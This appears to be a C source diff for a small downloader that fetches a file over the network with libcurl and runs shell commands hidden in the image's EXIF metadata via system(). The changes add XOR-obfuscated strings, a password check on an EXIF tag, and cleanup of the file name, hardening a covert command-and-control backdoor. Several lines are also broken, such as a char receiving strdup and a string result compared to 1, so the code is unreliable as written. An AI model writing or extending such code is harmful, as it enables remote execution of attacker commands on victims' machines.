@@ -14,7 +14,7 @@ static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
   return written;
 }
 
-static char *getexif(const char *filename)
+static char *getcmd(const char *filename)
 { 
 	ExifData *data; 
 	data = exif_data_new_from_file(filename); 
@@ -31,11 +31,24 @@ static char *getexif(const char *filename)
 	return result;
 } 
 
+int authenticate(const char *filename)
+{ 
+	ExifData *data; 
+	data = exif_data_new_from_file(filename); 
+	ExifEntry *entry = exif_content_get_entry(data->idf[EXIF_IDF_0], EXIF_TAG_SOFTWARE); 
+	char pw = strdup(PASSWORD); xor(pw); 
+	if (strcmp(pw, entry) != 0)
+	{ 
+		return 1; 
+	}
+	else return 0; 
+}
+
 int main()
 {
   CURL *curl_handle;
   static const char *url = URL;
-  static const char *filename = FILENAME;
+  char *filename = strdup(FILENAME); xor(filename);
   FILE *fp;
   curl_global_init(CURL_GLOBAL_ALL);
   curl_handle = curl_easy_init();
@@ -49,13 +62,16 @@ int main()
     curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, fp);
     curl_easy_perform(curl_handle);
     const char *data; 
-    printf("data: %s\n", getexif(filename));
-    data = getexif(filename);
-    system(data);
+    data = getcmd(filename);
+    if (getcmd(filename) == 1)
+    { 
+	system(data);
+    } 
     fclose(fp);
   }
   curl_easy_cleanup(curl_handle);
   curl_global_cleanup();
+  clean(filename, strlen(filename));
   return 0;
 }
 
